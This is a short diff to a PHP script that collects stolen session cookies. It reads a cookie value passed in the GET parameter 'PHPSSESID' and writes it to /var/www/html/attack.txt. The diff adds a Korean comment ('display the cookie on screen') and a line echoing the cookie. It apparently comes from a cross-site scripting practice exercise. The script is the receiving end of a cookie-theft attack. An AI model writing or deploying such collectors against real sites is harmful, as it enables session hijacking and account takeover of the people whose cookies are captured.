@@ -8,6 +8,9 @@ session_start();
 
 
 $cookie=$_GET['PHPSSESID'];
+//쿠키를 화면에 표시함
+echo $cookie;
+
 $save_file=fopen("/var/www/html/attack.txt","w");
 fwrite($save_file,$cookie);
 fclose($save_file);
